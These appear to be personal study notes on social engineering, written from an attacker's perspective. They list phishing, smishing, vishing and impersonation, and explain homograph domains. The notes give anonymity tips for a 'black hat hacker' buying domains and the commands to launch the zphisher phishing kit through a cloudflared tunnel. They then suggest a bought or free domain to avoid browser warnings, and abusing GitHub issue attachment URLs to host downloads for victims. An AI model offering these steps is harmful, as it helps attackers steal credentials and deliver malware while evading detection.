OSINT/INTL | Continued
data -> information -> knowledge
  I gather data
  information like what priveledge do this user have....
  after info I plan which person is suitable for the attack so I do my decision making
  then I look for tools, how to do the attack

attack types:
  smishing // phishing through text message
  vishing // voice phishing / phone number spoofing
  phishing // stealing sensitive data, downloading a virus, ransomware
  deception and impersonation // trust me I am recruiter from company x
  .....

homograph attack, twitter.com // have different w encoding which have same character
  when buying a domain a black hat hacker should use tore, use free visa not with his name, and other things to make himeself anonymous

tool:
  zphisher
  cd zphisher
  ./zphisher.sh
  run it locally
  cloudflared tunnle --url http://localhost:8080
    browser and cloudflare will know it is a phishing site and warn the user
      so I can buy a domain or get a domain for free
        register.it

on github you can try submitting an issue and then put a file the user can download, you don't need to submit it, just benifit from the url you will be getting
